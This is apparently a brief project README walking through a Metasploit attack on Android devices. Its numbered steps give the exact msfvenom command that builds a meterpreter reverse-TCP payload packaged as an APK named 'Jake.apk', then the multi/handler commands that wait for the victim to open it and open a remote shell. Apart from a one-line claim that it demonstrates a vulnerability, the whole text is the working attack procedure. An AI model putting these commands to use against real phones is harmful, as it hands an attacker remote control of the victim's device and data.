#_Metasploit_Process


The Main Goal of the Project is to show the vulnerability in a Android Device.

'''
1.The downloaded file is extracted in a location.
2.The cmd is opened at the exact same location.
3.The msfconsole command line helps to open the framework in console.
4.Commands like "banner" and "help" can be used to know more about the framework.
5.A new cmd is opened in the same directory.
6.The following cmd line is typed to create payload  in a particular location "msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.181.139 LPORT=4444 R>C:\Users\Dell\Downloads\Jake.apk".
7.In the metasploit console "msfconsole" type commands to create tcp connection in payload "use exploit/multi/handler" and "set payload android/meterpreter/reverse_tcp".
8.Set LHOST and LPORT as set "LHOST 192.168.181.139" and "set LPORT 4444".
9.Confirm the connection established using "show options".
10.Finally,use "exploit" command to establish connection.

'''

Note:The target has to be activated once to establish connection.


